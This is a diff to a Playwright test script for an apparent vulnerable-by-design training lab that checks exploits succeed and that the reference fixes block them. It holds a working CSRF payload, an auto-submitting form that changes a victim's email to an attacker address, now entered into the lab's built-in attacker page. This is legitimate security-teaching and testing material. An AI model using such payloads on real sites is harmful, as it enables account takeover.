@@ -5,16 +5,16 @@
 //
 // Default mode proves every exploit works and its flag is captured. MODE=fixed proves the
 // same attacks fail on the reference fixes and that "Check my fix" accepts all ten.
-// This wipes the lab's progress first. The CSRF step serves an attacker page on ATTACKER_PORT.
+// This wipes the lab's progress first. The CSRF step uses the lab's built-in attacker site (Mallory's
+// site), which the server runs on the next port (ATTACKER_PORT if you started it with --attacker-port).
 
 const assert = require("node:assert/strict");
 const fs = require("node:fs");
-const http = require("node:http");
 const path = require("node:path");
 const { chromium } = require("playwright");
 
 const BASE = (process.env.BREACHLAB_URL || "http://127.0.0.1:4160").replace(/\/$/, "");
-const ATTACKER_PORT = Number(process.env.ATTACKER_PORT || 4161);
+const ATTACKER_PORT = Number(process.env.ATTACKER_PORT || Number(new URL(BASE).port || 80) + 1);
 const ATTACKER = `http://${new URL(BASE).hostname}:${ATTACKER_PORT}`;
 const FIXED = process.env.MODE === "fixed";
 const OUT = path.join(__dirname, "out");
@@ -43,15 +43,6 @@ async function main() {
     assert.equal(await flags(), expected, `flag count after ${name}`);
     console.log(`${FIXED ? "blocked " : "captured"}  ${name}`);
   };
-
-  // The attacker's website: another origin on the same host, serving an auto-submitting form.
-  const attacker = http.createServer((request, response) => {
-    response.setHeader("Content-Type", "text/html");
-    if (request.url !== "/") return response.end("This is not Quillbook any more.");
-    response.end(`<body onload="document.forms[0].submit()"><form method="post" action="${BASE}/account">
-      <input name="display_name" value="Alice Moreau"><input name="email" value="attacker@evil.test"></form>`);
-  });
-  await new Promise((resolve) => attacker.listen(ATTACKER_PORT, "127.0.0.1", resolve));
 
   // Start from a clean lab.
   await page.goto(`${BASE}/lab`);
@@ -125,8 +116,17 @@ async function main() {
   await shot("06-mass-assignment");
   await settle("mass_assignment");
 
-  // 8. CSRF: an auto-submitting form on another origin (same host, different port).
-  await page.goto(`${ATTACKER}/`);
+  // 8. CSRF: an auto-submitting form on Mallory's site, the lab's built-in attacker origin (next port).
+  await page.goto(`${BASE}/lab/c/csrf`);
+  const attackerLink = page.getByRole("link", { name: `${ATTACKER}/` });
+  assert.equal(await attackerLink.getAttribute("href"), `${ATTACKER}/`);
+  await page.getByLabel("HTML of Mallory's page").fill(`<body onload="document.forms[0].submit()">
+    <form method="post" action="${BASE}/account"><input name="display_name" value="Alice Moreau">
+    <input name="email" value="attacker@evil.test"></form>`);
+  await page.getByRole("button", { name: "Save page" }).click();
+  await page.waitForURL(/saved=1/);
+  await shot("06b-mallory");
+  await page.getByRole("link", { name: "Mallory's site", exact: true }).click();
   await page.waitForURL(`${BASE}/account*`);
   await page.goto(`${BASE}/account`);
   assert.equal(await page.getByLabel("Email").inputValue(), FIXED ? "alice@quillbook.test" : "attacker@evil.test");
@@ -172,7 +172,6 @@ async function main() {
   await shot("12-mobile-challenge", { fullPage: true });
 
   await browser.close();
-  attacker.close();
   console.log(FIXED ? "All ten attacks are blocked and all ten fixes verified." : "All ten flags captured.");
 }
 
